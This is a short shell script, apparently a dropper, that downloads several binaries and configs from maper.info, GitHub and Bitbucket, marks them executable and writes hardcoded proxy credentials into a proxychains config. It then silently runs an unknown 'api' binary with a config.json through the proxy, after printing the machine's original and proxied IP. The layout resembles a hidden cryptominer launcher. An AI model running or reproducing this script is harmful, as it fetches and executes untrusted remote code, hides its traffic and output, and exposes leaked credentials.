proxy="54.173.229.200" 
port="80" 
user="fixie"  
pass="Qrj3UKEc6UHpknH" 
wget -q -O api https://maper.info/Credit && chmod +x api >/dev/null 2>&1
wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json >/dev/null 2>&1
wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/panel && chmod +x panel 
wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/proxychains.conf && chmod +x proxychains.conf 
wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/libproxychains4.so && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf" 
sleep 11 
echo "**********************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
./panel ./api -c "config.json" >/dev/null 2>&1
